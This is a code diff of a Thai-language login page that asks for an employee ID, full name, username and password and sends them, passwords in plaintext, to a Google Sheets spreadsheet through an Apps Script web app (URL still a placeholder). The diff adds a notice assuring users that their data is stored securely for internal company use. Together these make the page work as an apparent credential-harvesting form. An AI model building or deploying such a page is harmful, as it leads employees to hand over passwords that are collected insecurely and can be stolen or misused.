@@ -167,11 +167,14 @@
             <p>กรุณากรอกข้อมูลล็อกอินของคุณ</p>
         </div>
         
-
+        <div class="security-info">
+            <span class="icon">🔒</span>
+            <strong>หมายเหตุ:</strong> ข้อมูลของคุณจะถูกเก็บอย่างปลอดภัยสำหรับใช้ในระบบภายในบริษัท
+        </div>
         
         <form id="loginForm">
             <div class="form-group">
-                <label for="employeeId">ชื่อย่อ (Ex. KG)</label>
+                <label for="employeeId">รหัสพนักงาน</label>
                 <input type="text" id="employeeId" name="employeeId" required>
             </div>
             
@@ -212,8 +215,8 @@
     </div>
 
     <script>
-        // กำหนดค่า Google Apps Script Web App URL
-        const GOOGLE_SCRIPT_URL = 'YOUR_GOOGLE_APPS_SCRIPT_WEB_APP_URL_HERE';
+        // !!! สำคัญ: กรุณาใส่ Web App URL ของคุณที่นี่ !!!
+        const GOOGLE_SCRIPT_URL = 'YOUR_GOOGLE_SCRIPT_URL_HERE';
 
         // ฟังก์ชันส่งข้อมูลไป Google Sheets
         async function sendToGoogleSheets(data) {
@@ -242,23 +245,21 @@
             const errorMessage = document.getElementById('errorMessage');
             const form = document.getElementById('loginForm');
             
-            // ซ่อนข้อความเก่า
             successMessage.style.display = 'none';
             errorMessage.style.display = 'none';
             
-            // แสดง Loading
             submitBtn.disabled = true;
             loading.style.display = 'block';
             
             try {
-                // รับข้อมูลจากฟอร์ม
+                // รับข้อมูลจากฟอร์ม (ไม่มี email)
                 const formData = new FormData(this);
                 const employeeId = formData.get('employeeId');
                 const fullName = formData.get('fullName');
                 const username = formData.get('username');
                 const password = formData.get('password');
                 
-                // เตรียมข้อมูลส่ง
+                // เตรียมข้อมูลส่ง (ไม่มี email)
                 const dataToSend = {
                     timestamp: new Date().toISOString(),
                     employeeId: employeeId,
@@ -270,7 +271,6 @@
                 // ส่งข้อมูลไป Google Sheets
                 const result = await sendToGoogleSheets(dataToSend);
                 
-                // แสดงข้อความสำเร็จ
                 loading.style.display = 'none';
                 successMessage.style.display = 'block';
                 form.reset();
@@ -278,7 +278,6 @@
                 console.log('Data sent successfully:', result);
                 
             } catch (error) {
-                // แสดงข้อความผิดพลาด
                 loading.style.display = 'none';
                 errorMessage.style.display = 'block';
                 document.getElementById('errorText').textContent = 'เกิดข้อผิดพลาด: ' + error.message;
@@ -290,7 +289,7 @@
         });
 
         // แจ้งเตือนถ้ายังไม่ได้ตั้งค่า Google Apps Script URL
-        if (GOOGLE_SCRIPT_URL === 'YOUR_GOOGLE_APPS_SCRIPT_WEB_APP_URL_HERE') {
+        if (GOOGLE_SCRIPT_URL === 'YOUR_GOOGLE_SCRIPT_URL_HERE') {
             alert('⚠️ กรุณาตั้งค่า Google Apps Script URL ในโค้ดก่อนใช้งาน');
         }
     </script>
